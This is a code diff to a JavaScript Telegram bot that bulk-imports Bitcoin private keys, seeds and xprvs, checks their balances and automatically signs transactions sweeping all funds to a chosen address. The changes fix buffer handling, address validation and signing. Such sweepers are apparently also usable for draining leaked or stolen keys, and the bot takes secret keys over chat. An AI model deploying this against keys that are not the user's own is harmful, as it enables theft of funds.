@@ -1,5 +1,5 @@
 // worker.js – Ultimate Bitcoin Auto-Sweeper with Telegram Bot
-// Features: All key formats, bulk import, tx history, balance check, Trust Wallet scanning
+// FIXED: Uint8Array buffer issues, Psbt signing, and address validation
 
 import * as bitcoin from 'bitcoinjs-lib';
 import * as bip39 from 'bip39';
@@ -11,7 +11,7 @@ import { Buffer } from 'buffer';
 globalThis.Buffer = Buffer;
 const bip32 = BIP32Factory(ecc);
 const ECPair = ECPairFactory(ecc);
-bitcoin.initEccLib(ecc); // CRITICAL FIX for v6 isPoint validation
+bitcoin.initEccLib(ecc); 
 
 const NETWORK = bitcoin.networks.bitcoin;
 const DEFAULT_SAT_PER_BYTE = 15;
@@ -24,8 +24,22 @@ const PATHS = {
 };
 
 // ============================================================
-// KEY DETECTION
+// KEY & ADDRESS DETECTION
 // ============================================================
+function isValidAddress(address) {
+  try {
+    bitcoin.address.toOutputScript(address, NETWORK);
+    return true;
+  } catch {
+    try {
+      bitcoin.address.toOutputScript(address, bitcoin.networks.testnet);
+      return true;
+    } catch {
+      return false;
+    }
+  }
+}
+
 function detectKeyType(text) {
   const t = text.trim();
   if (!t) return 'unknown';
@@ -36,14 +50,12 @@ function detectKeyType(text) {
   if (/^yprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'yprv';
   if (/^zprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'zprv';
   if (/^tprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'tprv';
-  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(t)) return 'address_legacy';
-  if (/^bc1q[a-zA-HJ-NP-Z0-9]{38,58}$/.test(t)) return 'address_segwit';
-  if (/^bc1p[a-zA-HJ-NP-Z0-9]{58}$/.test(t)) return 'address_taproot';
+  if (isValidAddress(t)) return 'address';
   return 'unknown';
 }
 
 // ============================================================
-// ADDRESS DERIVATION
+// ADDRESS DERIVATION (FIXED: Buffer.from wrappers)
 // ============================================================
 function deriveAddressesFromMnemonic(mnemonic, scanDepth = 10) {
   const results = [];
@@ -55,17 +67,20 @@ function deriveAddressesFromMnemonic(mnemonic, scanDepth = 10) {
         try {
           const child = root.derivePath(`${basePath}/${i}`);
           if (!child.privateKey) continue;
-          const keyPair = ECPair.fromPrivateKey(child.privateKey, { network: NETWORK });
+          const privKey = Buffer.from(child.privateKey); // FIX
+          const keyPair = ECPair.fromPrivateKey(privKey, { network: NETWORK });
+          const pubkey = Buffer.from(keyPair.publicKey); // FIX
+          
           let payment;
           if (type === 'legacy') {
-            payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+            payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
           } else if (type === 'segwit') {
             payment = bitcoin.payments.p2sh({
-              redeem: bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK }),
+              redeem: bitcoin.payments.p2wpkh({ pubkey, network: NETWORK }),
               network: NETWORK
             });
           } else {
-            payment = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK });
+            payment = bitcoin.payments.p2wpkh({ pubkey, network: NETWORK });
           }
           if (payment.address) {
             results.push({ address: payment.address, keyPair, type, index: i });
@@ -85,8 +100,10 @@ function deriveAddressesFromXprv(xprvKey, scanDepth = 10) {
       try {
         const child = node.derive(0).derive(i);
         if (!child.privateKey) continue;
-        const keyPair = ECPair.fromPrivateKey(child.privateKey, { network: NETWORK });
-        const payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+        const privKey = Buffer.from(child.privateKey); // FIX
+        const keyPair = ECPair.fromPrivateKey(privKey, { network: NETWORK });
+        const pubkey = Buffer.from(keyPair.publicKey); // FIX
+        const payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
         if (payment.address) {
           results.push({ address: payment.address, keyPair, type: 'xprv', index: i });
         }
@@ -98,8 +115,9 @@ function deriveAddressesFromXprv(xprvKey, scanDepth = 10) {
 
 function deriveAddressesFromWif(wif) {
   try {
-    const keyPair = ECPair.fromWIF(wif, NETWORK);
-    const payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+    const keyPair = ECPair.fromWIF(wif); // FIX: Auto-detect network (supports testnet too)
+    const pubkey = Buffer.from(keyPair.publicKey); // FIX
+    const payment = bitcoin.payments.p2pkh({ pubkey, network: keyPair.network });
     return [{ address: payment.address, keyPair, type: 'wif', index: 0 }];
   } catch (e) { console.error('WIF error:', e); return []; }
 }
@@ -107,7 +125,8 @@ function deriveAddressesFromWif(wif) {
 function deriveAddressesFromHex(hex) {
   try {
     const keyPair = ECPair.fromPrivateKey(Buffer.from(hex, 'hex'), { network: NETWORK });
-    const payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+    const pubkey = Buffer.from(keyPair.publicKey); // FIX
+    const payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
     return [{ address: payment.address, keyPair, type: 'hex', index: 0 }];
   } catch (e) { console.error('Hex error:', e); return []; }
 }
@@ -182,7 +201,7 @@ function formatBtc(sats) {
 }
 
 // ============================================================
-// TRANSACTION BUILDING (Psbt for v6)
+// TRANSACTION BUILDING (FIXED: Psbt Signer)
 // ============================================================
 async function createSweepTx(keyPair, utxos, toAddress, feeRate, addrType) {
   const inputCount = utxos.length;
@@ -198,7 +217,6 @@ async function createSweepTx(keyPair, utxos, toAddress, feeRate, addrType) {
     const isLegacy = (addrType === 'legacy' || addrType === 'wif' || addrType === 'hex' || addrType === 'xprv');
     
     if (isLegacy) {
-      // Legacy requires the full raw transaction hex
       const txHex = await getTxHex(utxo.txid);
       psbt.addInput({
         hash: utxo.txid,
@@ -206,15 +224,15 @@ async function createSweepTx(keyPair, utxos, toAddress, feeRate, addrType) {
         nonWitnessUtxo: Buffer.from(txHex, 'hex'),
       });
     } else {
-      // Segwit/Native only requires the scriptPubKey and value
       let payment;
+      const pubkey = Buffer.from(keyPair.publicKey); // FIX
       if (addrType === 'segwit') {
         payment = bitcoin.payments.p2sh({
-          redeem: bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK }),
+          redeem: bitcoin.payments.p2wpkh({ pubkey, network: NETWORK }),
           network: NETWORK
         });
-      } else { // native
-        payment = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK });
+      } else { 
+        payment = bitcoin.payments.p2wpkh({ pubkey, network: NETWORK });
       }
       psbt.addInput({
         hash: utxo.txid,
@@ -233,7 +251,13 @@ async function createSweepTx(keyPair, utxos, toAddress, feeRate, addrType) {
   psbt.addOutput({ address: toAddress, value: amountToSend });
   
   for (let i = 0; i < utxos.length; i++) {
-    psbt.signInput(i, keyPair);
+    // FIX: Custom signer guarantees Buffer types for bitcoinjs-lib v6
+    const signer = {
+      publicKey: Buffer.from(keyPair.publicKey),
+      network: keyPair.network,
+      sign: (hash, lowR) => Buffer.from(keyPair.sign(hash, lowR))
+    };
+    psbt.signInput(i, signer);
   }
   
   psbt.finalizeAllInputs();
@@ -343,7 +367,6 @@ async function sweepAll(env, chatId, targetAddress = null) {
         if (balance < parseInt(MIN_BALANCE_TO_SWEEP)) continue;
 
         const feeRate = Math.min(await getRecommendedFee(), parseInt(MAX_FEE_RATE));
-        // Pass addr.type to createSweepTx so it knows if it's legacy or segwit
         const result = await createSweepTx(addr.keyPair, utxos, dest, feeRate, addr.type);
         if (result.error) {
           report.push(`⚠️ ${wallet.label} (${addr.address}): ${result.error}`);
@@ -377,7 +400,7 @@ async function importSingleKey(env, chatId, secret) {
   const { TELEGRAM_BOT_TOKEN, SCAN_DEPTH = "10" } = env;
   const keyType = detectKeyType(secret);
 
-  if (keyType === 'unknown' || keyType.startsWith('address')) {
+  if (keyType === 'unknown' || keyType === 'address') {
     return { success: false, msg: `Skipped (not a valid private key): <code>${secret.substring(0, 20)}...</code>` };
   }
 
@@ -445,8 +468,7 @@ async function importBulkKeys(env, chatId, text) {
 // ============================================================
 async function checkAddressInfo(env, chatId, address, showTxs = false) {
   const { TELEGRAM_BOT_TOKEN } = env;
-  const type = detectKeyType(address);
-  if (!type.startsWith('address')) {
+  if (!isValidAddress(address)) {
     await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid Bitcoin address.');
     return;
   }
@@ -683,8 +705,7 @@ async function handleTelegramUpdate(update, env) {
       return;
     }
     const addr = parts[1];
-    const type = detectKeyType(addr);
-    if (!type.startsWith('address')) {
+    if (!isValidAddress(addr)) {
       await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid Bitcoin address.');
       return;
     }
@@ -735,8 +756,7 @@ async function handleTelegramUpdate(update, env) {
       return;
     }
     const addr = parts[1];
-    const type = detectKeyType(addr);
-    if (!type.startsWith('address')) {
+    if (!isValidAddress(addr)) {
       await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid address.');
       return;
     }
@@ -772,7 +792,7 @@ async function handleTelegramUpdate(update, env) {
     return;
   }
 
-  if (keyType.startsWith('address')) {
+  if (keyType === 'address') {
     const recipients = await getRecipients(env, chatId);
     if (!recipients.includes(trimmed)) {
       recipients.push(trimmed);
